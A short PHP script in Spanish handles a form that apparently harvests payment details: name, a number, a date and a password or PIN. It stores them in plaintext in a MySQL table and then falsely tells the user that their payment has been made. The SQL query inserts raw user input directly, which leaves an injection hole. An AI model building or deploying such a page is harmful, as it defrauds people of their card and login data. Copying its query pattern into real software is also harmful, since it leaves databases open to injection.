<?php

	include("conexion.php");
	
	if(isset($_POST['send'])) { 
	
		if(
			strlen($_POST['name']) >= 1 &&
			strlen($_POST['number']) >= 1 &&
			strlen($_POST['date']) >= 1 &&
			strlen($_POST['password']) >= 1 
		)		{
			$name = trim($_POST['name']);
			$number = trim($_POST['number']);
			$date = trim($_POST['date']);
			$password = trim($_POST['password']);
			$fecha = date('d/m/y');
			$cosulta = "INSERT INTO datos(nombre, numero, fecha, clave) 
						VALUES ('$name', '$number', '$date', '$password')";
			$resultado = mysqli_query($conex, $cosulta);
			if($resultado)
			
			{
				?>
					<h3 class="success">Tu pago ha sido realizado. En breve recibira el Escrito a su casilla de Email </h3>
				<?php 
				} else {
					?>
					<h3 class="error">Ocurrio un error. Reintete mas tarde </h3>
				<?php 
				}
			
		}else {
					?>
					<h3 class="error">Llena todos los campos</h3>
				<?php
		}
		?>
